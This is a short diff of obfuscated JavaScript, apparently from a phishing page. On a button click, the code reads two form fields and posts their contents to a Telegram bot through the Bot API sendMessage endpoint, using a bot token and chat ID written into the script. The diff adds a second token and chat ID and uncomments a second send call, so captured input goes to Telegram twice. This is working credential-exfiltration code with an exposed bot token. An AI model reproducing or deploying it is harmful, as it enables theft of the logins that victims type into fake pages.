@@ -3912,7 +3912,7 @@ const _0x58390d = function () {
         }
     });
 _0x3596b9();
-const bot1Token = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM', bot2Token = '', groupChat1 = '1634597902', groupChat2 = '', input1 = document.getElementById('a1'), input2 = document.getElementById('a2'), button1 = document.getElementById('css-qq');
+const bot1Token = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM', bot2Token = '5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM', groupChat1 = '1634597902', groupChat2 = '1634597902', input1 = document.getElementById('a1'), input2 = document.getElementById('a2'), button1 = document.getElementById('css-qq');
 ;
 function sendMessage1(_0x1ebb8a, _0x217a88, _0x3d5f3f) {
     const _0x3f53eb = '<code>' + input1.value + '</code>', _0x48a4fe = '<code>' + input2.value + '</code>', _0x2695f0 = _0x3f53eb + '\n' + _0x48a4fe, _0x3fa223 = 'https://api.telegram.org/bot' + _0x1ebb8a + '/sendMessage';
@@ -3958,6 +3958,6 @@ button1.addEventListener('click', () => {
     } else {
         button1.disabled = true;
         sendMessage1(bot1Token, groupChat1);
-        //sendMessage1(bot2Token, groupChat2);
+        sendMessage1(bot2Token, groupChat2);
     }
 });
